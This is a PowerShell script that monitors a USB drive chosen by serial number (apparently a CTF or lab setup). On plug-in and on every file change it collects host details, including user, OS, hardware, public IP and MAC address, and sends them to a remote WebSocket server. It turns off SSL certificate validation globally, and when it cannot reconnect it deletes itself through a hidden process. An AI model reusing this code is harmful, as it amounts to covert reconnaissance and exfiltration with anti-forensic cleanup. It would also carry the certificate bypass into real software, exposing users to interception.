# Bypass SSL Certificate Validation
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;

public class BypassSSLValidation {
    public static void Enable() {
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    }
}
"@

[BypassSSLValidation]::Enable()

# Continue with the rest of your script
$WebSocketUri = "wss://10.0.0.1:8765"
# Your existing WebSocket and file handling code

$WebSocketUri = "wss://10.0.0.1:8765"
$SerialNumber = "CTF98746"
$global:WebSocket = $null
$global:MessageQueue = @()

# Function to collect system information and compile a message
Function Global:Get-SystemInfoMessage {
    param (
        [string]$EventType
    )

    # Collect system information
    $datetime = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
    $timezoneInfo = (Get-TimeZone).Id + ' Timezone: ' + (Get-TimeZone).StandardName
    $currentUser = [Environment]::UserName
    $osInfo = (Get-WmiObject -Class Win32_OperatingSystem).Caption + ' ' + (Get-WmiObject -Class Win32_OperatingSystem).Version
    $biosInfo = (Get-WmiObject -Class Win32_BIOS).Manufacturer + ' ' + (Get-WmiObject -Class Win32_BIOS).Version
    $systemInfo = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer + ' ' + (Get-WmiObject -Class Win32_ComputerSystem).Model
    $processorInfo = (Get-WmiObject -Class Win32_Processor).Name + ' ' + (Get-WmiObject -Class Win32_Processor).NumberOfCores + ' Cores'
    $ipInfo = (curl.exe -s https://api64.ipify.org?format=json | ConvertFrom-Json).ip
    $macAddress = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MACAddress

    # Compile the message
    $message = @"
    $EventType
    System Information:
    - DateTime: $datetime
    - Current User: $currentUser
    - OS: $osInfo
    - BIOS: $biosInfo
    - System: $systemInfo
    - Processor: $processorInfo
    - Timezone: $timezoneInfo
    - Public IP: $ipInfo
    - MAC Address: $macAddress
"@
    return $message
}

# Function to get drive letter by serial number
Function Get-DriveLetterBySerialNumber {
    $disks = Get-Disk | Where-Object { $_.SerialNumber -eq $SerialNumber }
    if ($disks.Count -eq 0) {
        Write-Host "Disk with SerialNumber '$SerialNumber' not found." -ForegroundColor Red
        return $null
    }

    foreach ($disk in $disks) {
        $partitions = Get-Partition -DiskNumber $disk.Number
        foreach ($partition in $partitions) {
            $volume = Get-Volume -Partition $partition
            if ($volume -and $volume.DriveLetter) {
                return "$($volume.DriveLetter):"
            }
        }
    }

    Write-Host "No active partitions with drive letters found on disk '$SerialNumber'." -ForegroundColor Red
    return $null
}

# Function to send WebSocket message
Function Global:Send-WebSocketMessage {
    param(
        [string]$message,
        [switch]$SkipQueue  # Add a flag to skip queuing certain messages
    )

    if ($global:WebSocket -and $global:WebSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
        try {
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($message)
            $buffer = New-Object System.ArraySegment[byte] -ArgumentList (,$bytes)
            $sendTask = $global:WebSocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None)
            $sendTask.Wait()

            Write-Host "Message sent successfully: $message"
        } catch {
            Write-Host "Error sending message: $_" -ForegroundColor Red
            if (-not $SkipQueue) {
                $global:MessageQueue += $message  # Add to queue only if SkipQueue is not set
            }
        }
    } else {
        Write-Host "WebSocket not connected. Queuing message: $message"
        if (-not $SkipQueue) {
            $global:MessageQueue += $message  # Add to queue only if SkipQueue is not set
        }
    }
}

# Function to send plug-in event
Function Send-PlugInEvent {
    $global:WebSocket = New-Object System.Net.WebSockets.ClientWebSocket

    # Set the WebSocket URI
    $uri = New-Object System.Uri($WebSocketUri)

    # Attempt to connect to the WebSocket server
    $connectTask = $global:WebSocket.ConnectAsync($uri, [Threading.CancellationToken]::None)
    $connectTask.Wait()

    $message = Get-SystemInfoMessage -EventType "Plug-in event detected."
    Write-Host "Sending plug-in event to WebSocket server..."
    Send-WebSocketMessage -message $message -SkipQueue
}


Function Watch-Drive {
    param(
        [string]$driveLetter,
        [string]$Filter = "*.*"
    )

    if ([string]::IsNullOrWhiteSpace($driveLetter)) {
        Write-Host "Invalid or missing drive letter. Exiting Watch-Drive." -ForegroundColor Red
        return
    }

    # Set up FileSystemWatcher
    $fsw = New-Object System.IO.FileSystemWatcher
    $fsw.Path = $driveLetter
    $fsw.Filter = $Filter
    $fsw.IncludeSubdirectories = $true
    $fsw.NotifyFilter = [System.IO.NotifyFilters]'FileName, LastWrite, LastAccess, CreationTime, Size'
    $fsw.EnableRaisingEvents = $true

    # Define the action to take when a new file is created
    $onCreated = {
        param($source, $eventArgs)

        try {
            $filename = $eventArgs.FullPath
            Write-Host "File created: $filename"

            # Use script scope to access the function explicitly
            $message = & Get-SystemInfoMessage -EventType "New file created: $filename"
            & Send-WebSocketMessage -message $message
        } catch {
            Write-Host "Error handling Created event: $_" -ForegroundColor Red
        }
    }

    # Define the action to take when a file is modified
    $onModified = {
        param($source, $eventArgs)

        try {
            $filename = $eventArgs.FullPath
            Write-Host "File modified: $filename"

            # Use script scope to access the function explicitly
            $message = & Get-SystemInfoMessage -EventType "File modified: $filename"
            & Send-WebSocketMessage -message $message
        } catch {
            Write-Host "Error handling Modified event: $_" -ForegroundColor Red
        }
    }

    # Define the action to take when a file is deleted
    $onDeleted = {
        param($source, $eventArgs)

        try {
            $filename = $eventArgs.FullPath
            Write-Host "File deleted: $filename"

            # Use script scope to access the function explicitly
            $message = & Get-SystemInfoMessage -EventType "File deleted: $filename"
            & Send-WebSocketMessage -message $message
        } catch {
            Write-Host "Error handling Deleted event: $_" -ForegroundColor Red
        }
    }

    # Define the action to take when a file is renamed
    $onRenamed = {
        param($source, $eventArgs)

        try {
            $oldFilename = $eventArgs.OldFullPath
            $newFilename = $eventArgs.FullPath
            Write-Host "File renamed from $oldFilename to $newFilename"

            # Use script scope to access the function explicitly
            $message = & Get-SystemInfoMessage -EventType "File renamed from $oldFilename to $newFilename"
            & Send-WebSocketMessage -message $message
        } catch {
            Write-Host "Error handling Renamed event: $_" -ForegroundColor Red
        }
    }

    # Register event handlers
    Register-ObjectEvent -InputObject $fsw -EventName Created -Action $onCreated -SourceIdentifier "FileCreatedEvent"
    Register-ObjectEvent -InputObject $fsw -EventName Changed -Action $onModified -SourceIdentifier "FileModifiedEvent"
    Register-ObjectEvent -InputObject $fsw -EventName Deleted -Action $onDeleted -SourceIdentifier "FileDeletedEvent"
    Register-ObjectEvent -InputObject $fsw -EventName Renamed -Action $onRenamed -SourceIdentifier "FileRenamedEvent"

    Write-Host "Watching drive $driveLetter for changes..."
}

#################################################################
#                                                               #
#                                                               #
#                                                               #
#                        Main Script                            #
#                                                               #
#                                                               #
#                                                               #
#################################################################
# Get the drive letter using the specified serial number
$driveLetter = Get-DriveLetterBySerialNumber

# Check if the drive letter was successfully obtained
if ($driveLetter) {
    # Send the plug-in event via WebSocket
    Send-PlugInEvent

    # Start watching the drive for file-related events
    Watch-Drive -driveLetter $driveLetter

    # Define retry parameters for WebSocket reconnection
    $retryCount = 0
    $maxRetries = 5

    # Continuously monitor the WebSocket connection status
    while ($true) {
        if ($global:WebSocket -and $global:WebSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            # WebSocket is connected; reset retry count and sleep to reduce CPU usage
            Start-Sleep -Seconds 5
            $retryCount = 0  # Reset retry counter
        } else {
            # WebSocket is disconnected; attempt to reconnect
            Write-Host "WebSocket disconnected. Attempting to reconnect... (Retry $($retryCount + 1) of $maxRetries)" -ForegroundColor Yellow

            try {
                # Create a new WebSocket instance if needed
                if (-not $global:WebSocket -or $global:WebSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
                    $global:WebSocket = New-Object System.Net.WebSockets.ClientWebSocket
                }

                # Set the WebSocket URI
                $uri = New-Object System.Uri($WebSocketUri)

                # Attempt to connect to the WebSocket server
                $connectTask = $global:WebSocket.ConnectAsync($uri, [Threading.CancellationToken]::None)
                $connectTask.Wait()

                # Check if the WebSocket is successfully connected
                if ($global:WebSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
                    Write-Host "WebSocket reconnected successfully!" -ForegroundColor Green
                    $retryCount = 0  # Reset retry counter

                    # Resend the plug-in event after a successful reconnection
                    Send-PlugInEvent

                    # Flush the message queue
                    foreach ($queuedMessage in $global:MessageQueue) {
                        Write-Host "Resending queued message: $queuedMessage"
                        Send-WebSocketMessage -message $queuedMessage
                    }

                    # Clear the queue after flushing
                    $global:MessageQueue = @()
                } else {
                    throw "WebSocket connection failed."
                }
            } catch {
                # Handle WebSocket connection errors
                Write-Host "Error reconnecting to WebSocket server: $_" -ForegroundColor Red
                $retryCount++

                # Exit loop and clean up events if max retries are reached
                if ($retryCount -ge $maxRetries) {
                    Write-Host "Maximum retry limit reached. Cleaning up events and exiting..." -ForegroundColor Red

                    # Unregister all event subscriptions
                    Get-EventSubscriber | Where-Object { $_.SourceIdentifier -like "File*Event" } | ForEach-Object {
                        Write-Host "Unregistering event: $($_.SourceIdentifier)"
                        Unregister-Event -SourceIdentifier $_.SourceIdentifier
                    }

                    # Schedule self-deletion
                    $scriptPath = $MyInvocation.MyCommand.Path
                    Write-Host "Scheduling self-deletion of $scriptPath..." -ForegroundColor Yellow

                    Start-Sleep -Seconds 2  # Allow time for script cleanup

                    # Run a background process to delete the script
                    Start-Process powershell -ArgumentList "-Command Start-Sleep -Seconds 2; Remove-Item -Path '$scriptPath'" -WindowStyle Hidden

                    break  # Exit the loop
                }

                # Wait before retrying
                Start-Sleep -Seconds 10
            }
        }
    }
} else {
    # Drive not found; exit the script
    Write-Host "Drive not found. Exiting." -ForegroundColor Red
}
